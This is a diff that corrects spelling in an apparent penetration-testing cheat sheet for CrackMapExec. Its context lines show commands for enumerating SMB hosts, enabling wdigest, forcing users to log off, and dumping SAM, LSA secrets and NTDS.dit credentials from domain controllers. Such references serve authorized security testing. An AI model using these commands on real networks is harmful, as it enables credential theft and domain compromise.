@@ -4,7 +4,7 @@
 
 ## cme - enumerate hosts, network
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
-Exemple : cme smb 192.168.1.0/24
+Example : cme smb 192.168.1.0/24
 
 https://mpgn.gitbook.io/crackmapexec/
 
@@ -114,7 +114,7 @@ cme smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enab
 ## cme - loggout user
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
 
-Can be usefull after enable wdigest to force user to reconnect
+Can be useful after enable wdigest to force user to reconnect
 
 ```bash
 cme smb <ip> -u <user> -p '<password>' -x 'quser'
@@ -166,7 +166,7 @@ cme smb <ip> -u <user> -p <password> -d <domain> --sam
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump LSA secrets using methods from secretsdump.py
-Requires Domain Admin or Local Admin Priviledges on target Domain Controller
+Requires Domain Admin or Local Admin Privileges on target Domain Controller
 
 ```bash
 cme smb <ip> -u <user> -p <password> -d <domaine> --lsa
@@ -176,7 +176,7 @@ cme smb <ip> -u <user> -p <password> -d <domaine> --lsa
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump the NTDS.dit from target DC using methods from secretsdump.py
-Requires Domain Admin or Local Admin Priviledges on target Domain Controller
+Requires Domain Admin or Local Admin Privileges on target Domain Controller
 
 ```bash
 cme smb <ip> -u <user> -p <password> -d <domain> --ntds
